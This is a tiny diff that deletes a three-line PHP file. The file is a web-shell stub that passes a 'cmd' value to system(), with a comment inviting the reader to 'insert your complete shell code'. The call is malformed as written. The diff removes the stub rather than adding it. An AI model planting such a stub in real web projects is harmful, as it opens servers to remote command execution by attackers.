@@ -1,3 +1,0 @@
-<?
-system(['cmd']);//or you can insert your complete shell code
-?>
